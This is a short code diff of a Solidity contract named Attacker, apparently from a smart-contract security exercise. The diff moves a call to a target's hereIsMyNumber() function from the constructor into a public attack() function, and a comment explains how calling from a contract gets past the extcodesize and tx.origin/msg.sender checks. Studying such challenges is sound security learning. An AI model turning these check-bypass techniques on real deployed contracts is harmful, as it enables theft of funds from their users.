@@ -10,8 +10,10 @@ contract Attacker {
     calling the function subsequently, this will pass the extcodesize
     check and the tx.origin and msg.sender will be different. 
     */
-    constructor(CallMeMaybe addr){
-        addr.hereIsMyNumber();
+
+    function attack (CallMeMaybe _addr) public
+    {
+        _addr.hereIsMyNumber();
     }
     
     receive() external payable {}
